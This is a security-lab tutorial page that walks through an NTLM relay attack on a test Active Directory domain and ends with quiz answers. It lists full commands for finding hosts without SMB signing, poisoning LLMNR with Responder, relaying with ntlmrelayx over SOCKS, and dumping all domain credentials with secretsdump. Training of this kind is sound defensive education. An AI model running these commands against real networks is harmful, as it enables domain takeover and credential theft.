#NTLM relay

An NTLM relay attack focuses on intercepting NTLM messages sent from a legitimate client trying to access some service, modifying them, and redirecting them to a legitimate server, impersonating the original client. This attack can be perpetrated by an attacker which positions themselves between the server and the client (MITM).

This MITM position can be reached through the use of the LLMNR poisoning attack, for example, also addressed in this lab.

In order to perpetrate this attack, two terminals will be used. In order to use two terminals, access the "Attacker2" machine and execute the following:
```
ip add add 192.168.122.35/24 dev eth0
ssh ubuntu@192.168.122.2
#introduce ubuntu's password (it's 'ubuntu')
```

Now, onto the attack. This attack will only work against machines that have SMB signing disabled. To check which machines are vulnerable, execute the following:
```
crackmapexec smb 192.168.122.0/24
```
It seems that both MEMBER and CAPTAIN have SMB signing disabled, both being susceptible to this attack.

To perpetrate this attack, first change the 'Responder.conf' file content to what can be seen in  [Responder.conf.txt](../single-domain-attacks/Responder.conf.txt). Then, create a file named 'targets.txt' with the contents seen in  [targets.txt](../single-domain-attacks/targets.txt). Now, in one terminal:

```
ntlmrelayx.py -tf targets.txt -socks -smb2support
#if you see some permission error upon running this script, do the following
readlink -f $(which python3)
sudo setcap cap_net_bind_service=+ep <output from the last command>
```
Once the ntlmrelayx.py script is listening for incoming NTLM messages, on a different terminal, start the Responder tool, which will poison legitimate clients through LLMNR, which will result in the client sending NTLM messages to the attacker.

```
#in the Responder directory
sudo -E python3 Responder.py -I ens3
```
After waiting for +/- 5 minutes, you should now have relayed authentication from both the Administrator and Hank accounts to the CAPTAIN DC. In order to verify relayed connections, run the following:
```
#in the ntlmrelayx terminal
socks
```
This command will output connections that can be used through a SOCKS5 proxy. You can now perform a DCSync attack using the Administrator connection, since this account has the necessary permissions to replicate DC data. With the DCSync, you retrieve every domain credential, compromising the domain. For this, use the secretsdump.py script from Impacket, along with the proxychains4 tool, in order to use the SOCKS proxy, and therefore, the Administrator's connection (Do not stop the ntlmrelayx script from running, stop the Responder tool and use that same terminal):
```
sudo -E proxychains4 $(which secretsdump.py) -no-pass -use-vss POLARIS/Administrator@192.168.122.10
```

This way, just by relaying NTLM messages, an attacker is able to compromise the whole domain.

!!! question
    How was the attacker able to position itself between the client and the server? 
??? success "Answer"
    The MITM position was reached through LLMNR poisoning through the Responder tool. The Responder tool listens for legitimate LLMNR requests and issues poisoned replies to clients, indicating that the server that the client wants to access is in fact the attacker machine. This way the attacker can position itself between the client and server.
!!! question
    What's the role of the SOCKS proxy in this attack?
??? success "Answer"
    In this attack, the attacker establishes a SOCKS5 proxy on their own machine, bound to the context of the compromised session (Admin/Hank's) by means of a NTLM relay attack. Tools like proxychains then route traffic through this proxy, making it appear as if requests originate from the relayed host. This enables the attacker to directly access internal services—such as dumping credentials with secretsdump.py—using the victim’s authenticated session.